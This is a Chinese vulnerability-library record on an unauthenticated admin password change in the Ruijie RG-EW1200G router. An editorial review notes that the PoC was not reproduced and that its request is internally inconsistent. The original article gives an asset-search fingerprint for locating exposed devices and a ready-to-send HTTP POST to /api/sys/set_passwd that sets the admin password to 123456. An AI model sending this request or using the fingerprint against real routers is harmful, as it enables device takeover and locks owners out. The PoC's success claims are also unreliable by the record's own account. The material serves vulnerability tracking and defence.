---
source: "wy876 漏洞文库"
id: "vw-d55f9a3d25a6f961c6a2ced2"
entity_id: "ve-d55f9a3d25a6f961c6a2ced2"
schema_version: "1"
title: "锐捷RG-EW1200G路由器未授权任意密码修改"
product: "Ruijie RG-EW1200G"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "示例无Cookie，固件未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7RG-EW1200G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9.md"
review_date: "2026-10-02"
side_effects: "账户操作会新增用户或更改认证材料，可能使原用户失去访问；须核对角色、操作前账户状态及恢复路径"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/bwyubc8k94kw6h1e"
source_status: "recorded"
---

# 锐捷RG-EW1200G路由器未授权任意密码修改

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie RG-EW1200G
- 本文讨论：api/sys/set_passwd管理员密码修改
- 版本、权限与配置前提：示例无Cookie，固件未知
- 资料类型：未授权改密PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- Content-Length:0却有JSON正文，原始请求不自洽
- JSON体配form Content-Type，是否服务端无视类型需明确
- 无成功响应/新密码登录证据，影响控制内网过度延伸
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 账户操作会新增用户或更改认证材料，可能使原用户失去访问；须核对角色、操作前账户状态及恢复路径

### 待核与来源

- 是否匿名/版本/内容类型接受行为待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# <font style="color:rgba(0, 0, 0, 0.9);">一、漏洞简介</font>
<font style="color:rgba(0, 0, 0, 0.9);">锐捷网络RG-EW1200G 存在未授权任意密码修改漏洞，允许任何用户未授权修改密码。登录路由器，获取敏感信息，控制内部网络</font>

# 二、影响版本
+ <font style="color:rgba(0, 0, 0, 0.9);">RG-EW1200G无线路由器</font>

# 三、资产测绘
```plain
body="/static/js/app.09df2a9e44ab48766f5f.js"
```


+ 登录页面


# 四、漏洞复现
```http
POST /api/sys/set_passwd HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

{"username":"admin","admin_new":"123456"}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bwyubc8k94kw6h1e>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
